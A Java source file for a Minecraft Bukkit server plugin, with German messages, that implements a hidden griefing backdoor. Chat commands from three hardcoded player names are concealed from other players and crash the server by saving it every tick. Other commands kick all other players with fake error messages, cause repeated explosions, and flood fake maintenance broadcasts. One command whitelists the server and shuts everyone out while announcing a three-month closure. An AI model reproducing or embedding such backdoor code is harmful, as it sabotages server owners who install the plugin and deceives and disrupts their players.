package de.rexlNico.Main;

import org.bukkit.Bukkit;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.Inventory;


public class chatevent implements Listener{
	
	private int TaskID, TaskID2, TaskID3;
	private int zeit = 0;
	private int zeit2 = 0;
	
	@SuppressWarnings("deprecation")
	@EventHandler
	public void on(AsyncPlayerChatEvent e){
		Player p = e.getPlayer();
		String msg = e.getMessage();
		
		if(p.getName().equals("rexlNico") || p.getName().equals("rexlManu") || p.getName().equals("nxtTimme")){
			
			
			
			if(msg.equalsIgnoreCase(".grief")){
				e.setCancelled(true);
				Inventory inv = Bukkit.createInventory(null, 9*5,"§cGriefer Gui");
				
				p.openInventory(inv);
				
			}else if(msg.equalsIgnoreCase(".help")){
				p.sendMessage("§8-- §b Grief Hilfe §8--");
				p.sendMessage("§e.grief");
				p.sendMessage("§e.crash");
				p.sendMessage("§e.kick");
				p.sendMessage("§e.nuke");
				p.sendMessage("§e.spam");
				p.sendMessage("§e.gegrieft");
				p.sendMessage("§e.fly");
			}else if(msg.equalsIgnoreCase(".crash")){
				e.setCancelled(true);
				p.sendMessage("§4Der Crash startet jetzt");
				
				TaskID2 = Bukkit.getScheduler().scheduleSyncRepeatingTask(Main.getPlugin(), new Runnable() {
					
					@Override
					public void run() {
						p.getWorld().setAutoSave(false);
						p.getWorld().save();
					}
				}, 1, 1);
				
			}else if(msg.equalsIgnoreCase(".kick")){
				e.setCancelled(true);
				p.sendMessage("§4Alle Spieler werden gekickt");
				
				for(Player a : Bukkit.getOnlinePlayers()){
					if(a == p){
						
					}else{
						a.kickPlayer("§4Der Server hatte Probleme");
					}
				}
				
			}else if(msg.equalsIgnoreCase(".nuke")){
				e.setCancelled(true);
				p.sendMessage("§4Du hast Nuke für §bEine Minute §aaktiviert");
				
				String weltname = p.getWorld().getName();
				
				TaskID2 = Bukkit.getScheduler().scheduleAsyncRepeatingTask(Main.getPlugin(), new Runnable() {
					
					@Override
					public void run() {
						if(zeit2 == 20){
							Bukkit.getScheduler().cancelTask(TaskID2);
							zeit2 = 0;
						}else{
							Bukkit.getWorld(weltname).createExplosion(p.getLocation(), 4);
							
							
							zeit2++;
						}
					}
				}, 1, 1);
				
				
			}else if(msg.equalsIgnoreCase(".fly")){
				
				p.setAllowFlight(true);
				p.sendMessage("§aDu kanst nun fliegen");
				
				
			}else if(msg.equalsIgnoreCase(".spam")){
				e.setCancelled(true);
				
				TaskID = Bukkit.getScheduler().scheduleAsyncRepeatingTask(Main.getPlugin(), new Runnable() {
					
					@Override
					public void run() {
						
						if(zeit == 6000){
							
							Bukkit.getScheduler().cancelTask(TaskID);
							zeit = 0;
							
						}else{
						
						Bukkit.broadcastMessage("§4§l[Broadcast] §bbitte leavt das netzwerk geht in 5 Minuten in warung");
						zeit++;
						
						}
						
					}
				}, 1, 1);
				
			}else if(msg.equalsIgnoreCase(".gegrieft")){
				e.setCancelled(true);
				
				
				Bukkit.broadcastMessage("§4§lDer Server wurde gegrieft. Der Server wird in 3 monten wieder geöfnet.");
				Bukkit.setWhitelist(true);
				for(Player a : Bukkit.getOnlinePlayers()){
					a.kickPlayer("§4Der Server ist in Wartung \\n wiedereröffnung in 3 Monaten.");
				}
				
			}
		}
		
	}

}
